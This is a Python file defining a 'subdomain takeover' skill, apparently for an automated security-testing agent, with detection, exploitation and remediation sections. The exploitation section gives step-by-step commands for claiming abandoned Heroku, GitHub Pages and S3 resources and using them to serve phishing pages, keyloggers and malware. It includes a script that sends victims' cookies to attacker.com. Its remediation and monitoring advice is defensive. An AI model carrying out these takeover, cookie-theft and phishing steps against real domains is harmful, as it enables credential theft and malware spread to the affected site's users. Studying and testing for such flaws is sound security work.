"""
Subdomain Takeover Skill - Detect stale DNS records and exploit unregistered services
"""

SKILL = {
    "id": "subdomain_takeover",
    "name": "Subdomain Takeover",
    "category": "web",
    "severity": "critical",

    "detection": """
1. ENUMERATE SUBDOMAINS using subdomain_enum tool:
   - Collect all CNAME records pointing to external services
   - Look for patterns: *.herokuapp.com, *.github.io, *.s3.amazonaws.com, etc.
   - Also check A records pointing to potentially disposable IPs

2. CHECK CNAME TARGETS for deprovisioned services:
   Common vulnerable targets:
   - Heroku: app-name.herokuapp.com → If app deleted, anyone can claim it
   - GitHub Pages: username.github.io → If user deleted account, takeover possible
   - AWS S3: bucket-name.s3.amazonaws.com → If bucket deleted or misconfigured
   - Azure: app.azurewebsites.net → If service terminated
   - Shopify: shop-name.myshopify.com → If store deleted
   - Zendesk: company.zendesk.com → If account closed
   - Wordpress.com: blog-name.wordpress.com → If blog deleted
   - Fastly CDN → If origin removed
   - CloudFront → If distribution deleted
   - Unbounce: pages.unbounce.com → If campaign removed

3. IDENTIFY TAKEOVER SYMPTOMS:
   Using http_headers_check and tech_fingerprint tools, look for:

   a) Default error pages (indicates service is deprovisioned):
      - Heroku: "No such app" page or 404 with Heroku branding
      - GitHub Pages: 404 from GitHub
      - S3: "The specified bucket does not exist" XML
      - Azure: "404 - Web app not found"
      - Shopify: "Oops! We're sorry, we couldn't find that page"

   b) CNAME but no response:
      - HTTP 404/403 on subdomain
      - curl returns NXDOMAIN or timeout
      - dig +short subdomain.target.com returns nothing
      - Or curl returns default error page of the service provider

   c) Check tech_fingerprint output:
      - Server header reveals the target service
      - Look for patterns in error messages

4. SPECIFIC TEST PROCEDURE:
   ```bash
   # Step 1: Get all CNAMEs
   dig cname app.target.com
   dig cname api.target.com
   dig cname cdn.target.com

   # Step 2: Check what service it points to
   # Result: app.target.com CNAME app-123.herokuapp.com

   # Step 3: Try to access it
   curl -v https://app.target.com
   # Look for error page indicating deprovisioned service

   # Step 4: Check the actual Heroku endpoint
   curl -v https://app-123.herokuapp.com
   # If 404 "No such app", it's available for takeover
   ```

5. DNS MONITORING INDICATORS:
   - CNAME points to service but service returns 404
   - Service returns "page not found" but not the normal domain's 404
   - Error page shows service provider branding (Heroku logo, etc)
   - HTTP status 404 with service-specific error message

6. VULNERABLE PATTERNS:
   Test these subdomain naming patterns:
   - api.target.com → api.herokuapp.com
   - cdn.target.com → cloudfront.amazonaws.com
   - images.target.com → s3.amazonaws.com
   - blog.target.com → wordpress.com
   - help.target.com → zendesk.com
   - pages.target.com → github.io
   - mail.target.com → mail provider
""",

    "exploitation": """
1. HEROKU TAKEOVER:
   a) Detect: CNAME points to *.herokuapp.com, curl returns "No such app"

   b) Claim the app:
      - Create free Heroku account (or use existing)
      - heroku login
      - heroku create app-123  (match the exact app name from CNAME)
      - Once claimed, you control app-123.herokuapp.com
      - Now app.target.com points to YOUR malicious Heroku app

   c) Exploit:
      - Serve malicious content at your Heroku app
      - Victim visiting app.target.com gets your content
      - If target.com has parent domain cookies (SameSite=None), steal them
      - Serve phishing page, JavaScript keylogger, credential harvester
      - Example: Redirect to login form that harvests credentials

   d) Example malicious Procfile:
      ```
      web: python -m http.server 8000
      ```
      Create index.html with phishing content, push to Heroku

2. GITHUB PAGES TAKEOVER:
   a) Detect: CNAME points to username.github.io, account no longer exists

   b) Claim the pages:
      - Create GitHub account with same username (if available)
      - Create repo called username.github.io
      - Push malicious content
      - Now username.github.io resolves to YOUR pages
      - Target subdomain points to your content

   c) Exploit: Same as Heroku - phishing, malware distribution

3. AWS S3 BUCKET TAKEOVER:
   a) Detect:
      - CNAME points to s3.amazonaws.com or s3-region.amazonaws.com
      - curl returns "The specified bucket does not exist"
      - Or returns 403 with NoSuchBucket error

   b) Claim the bucket:
      - aws s3api create-bucket --bucket bucket-name --region us-east-1
      - Or use AWS CLI: aws s3 mb s3://bucket-name

   c) Exploit:
      - aws s3 cp malicious.html s3://bucket-name/index.html --acl public-read
      - Now bucket.target.com serves your content
      - Can distribute malware, phish credentials, steal data

4. CROSS-DOMAIN COOKIE THEFT:
   If parent domain has cookies with SameSite=None:

   a) Takeover subdomain as above
   b) Serve JavaScript that accesses document.cookie
   c) Example (in takeover page):
      ```html
      <script>
      // Check if parent domain cookies are accessible
      console.log(document.cookie);
      // If cookies visible, send to attacker server
      fetch('https://attacker.com/log?cookies=' + encodeURIComponent(document.cookie));
      </script>
      ```

   d) Impact:
      - Steal session tokens for target.com
      - If tokens valid cross-domain, impersonate user
      - Access API endpoints, modify data, escalate privileges

5. PHISHING ATTACK ON TAKEOVER:
   a) Create professional-looking login page
   b) Serve it from takeover subdomain
   c) Send email: "Your mail.target.com requires re-authentication"
   d) User clicks link to http://mail.target.com (your takeover)
   e) User enters credentials thinking they're on legitimate site
   f) You capture credentials, can now access their account

6. MALWARE DISTRIBUTION:
   a) Takeover cdn.target.com pointing to S3
   b) Upload malware.exe or malicious.pdf
   c) Users visiting cdn.target.com/malware.exe
   d) Trust the domain, don't suspect it's compromised
   e) Execute malware on their machines

7. TESTING FOR PARENT DOMAIN COOKIES:
   ```javascript
   // Run in browser console on target.com subdomain (after takeover)
   document.cookie  // See all cookies accessible from this origin

   // If you see session tokens, JWT, auth cookies → exploit successful
   // Send them to attacker server or use to impersonate user
   ```
""",

    "remediation": """
1. IMMEDIATE ACTIONS:

   a) Audit all DNS records:
      ```bash
      dig axfr @ns1.target.com target.com  # Full zone transfer (if allowed)
      dig +short cname *.target.com  # Check all CNAME records
      nslookup -type=CNAME target.com  # Alternative method
      ```

   b) Identify dangling CNAMEs (pointing to deprovisioned services):
      - For each CNAME, verify the target service still exists
      - For Heroku: heroku apps:info app-name
      - For S3: aws s3 ls s3://bucket-name
      - For GitHub Pages: curl https://username.github.io -v
      - For Azure: check Azure portal for active services

   c) Remove ALL stale DNS records:
      ```bash
      # In your DNS provider (Route53, Cloudflare, etc)
      # Delete CNAME record for: app.target.com
      # Delete A record pointing to deprovisioned IPs
      ```

   d) For each subdomain still in use:
      - Verify it points to an actively maintained service
      - Document who owns it and why it exists
      - Set reminder to review quarterly

2. HARDENING - Prevent future takeovers:

   a) DNS Monitoring:
      - Tool: Cloudflare DNS, Route53 CloudTrail, or third-party monitoring
      - Alert on: New DNS record creation, CNAME changes, deletions
      - Review alerts weekly
      - Example: Cloudflare Worker that alerts on DNS changes

   b) Service Lifecycle Management:
      - When decommissioning service (close Heroku app, delete S3 bucket):
         1. Immediately remove DNS record
         2. Wait 24 hours
         3. Verify no one re-registered the service name
      - Document deprecation timeline
      - Require approval for DNS changes

   c) Use safer alternatives where possible:
      - Instead of subdomain.target.com pointing to external service
      - Use reverse proxy (NGINX, HAProxy) on owned infrastructure
      - Example: api.target.com routes to your proxy, proxy forwards to real API
      - This way you maintain DNS control, not dependent on external service

   d) CDN/Fastly specific:
      - Lock CDN configurations
      - Require approval to remove origins
      - Archive deleted configurations with timestamps

3. MONITORING FOR ATTACKS:

   a) Check for unexpected content on subdomains:
      ```bash
      # Regularly (daily) check all subdomains return expected content
      curl -v https://app.target.com 2>&1 | grep -i "heroku\\|github\\|amazon"
      # If unexpected service headers appear, investigate
      ```

   b) Monitor uptime:
      - Alert if subdomain returns 404 or 403
      - Could indicate someone took over your domain

   c) HTTPS certificate monitoring:
      - If subdomain now has different SSL cert owner
      - Indicates takeover in progress
      - Use: https://crt.sh or Certificate Transparency logs

4. DETECTION - Know if you've been compromised:

   Check for signs:
   ```bash
   # Does subdomain serve unexpected content?
   curl https://app.target.com | grep -i "phishing\\|malware\\|login"

   # Does it have different SSL certificate?
   openssl s_client -connect app.target.com:443 </dev/null 2>&1 | grep -i "subject="

   # Does DNS CNAME point somewhere unexpected?
   dig app.target.com CNAME +short

   # Is there unexpected HTTP header content?
   curl -I https://app.target.com | grep -E "Server|Powered-by"
   ```

5. VERIFICATION:

   ```bash
   # Verify all CNAMEs are cleaned up or point to active services
   for subdomain in api app cdn images blog help; do
       echo "Checking ${subdomain}.target.com..."
       dig ${subdomain}.target.com CNAME +short
       curl -I https://${subdomain}.target.com 2>&1 | grep -E "HTTP|Location|Server"
   done
   ```
""",

    "tools": ["subdomain_enum", "http_headers_check", "tech_fingerprint"],

    "payloads": [
        # Service fingerprints to detect deprovisioned status
        "No such app",  # Heroku
        "Heroku | Welcome to your new app",  # Fresh Heroku
        "The specified bucket does not exist",  # AWS S3
        "404 - Web app not found",  # Azure
        "page not found",  # GitHub Pages
        "Oops! We're sorry, we couldn't find that page",  # Shopify
        "Does not exist",  # Zendesk
        "Not Found",  # Generic 404
        "301 Moved Permanently",  # Redirect to parent
        "Server Error",  # Service error
        # CNAME patterns to test
        "*.herokuapp.com",
        "*.github.io",
        "*.s3.amazonaws.com",
        "*.azurewebsites.net",
        "*.myshopify.com",
        "*.zendesk.com",
        "*.wordpress.com",
        "*.cloudfront.net",
        "*.fastly.net",
    ],

    "references": [
        "CWE-913 - Improper Control of Dynamically-Managed Code Resources",
        "CAPEC-89 - DNS Rebinding",
        "https://owasp.org/www-community/attacks/DNS_Spoofing",
        "https://blog.projectdiscovery.io/subdomain-takeover-guide/",
        "https://www.hackerone.com/resource/reporting-guidelines-for-subdomain-takeover",
        "Bugcrowd: Subdomain Takeover Guide",
        "PortSwigger Web Security Academy: DNS-based vulnerabilities",
    ],
}
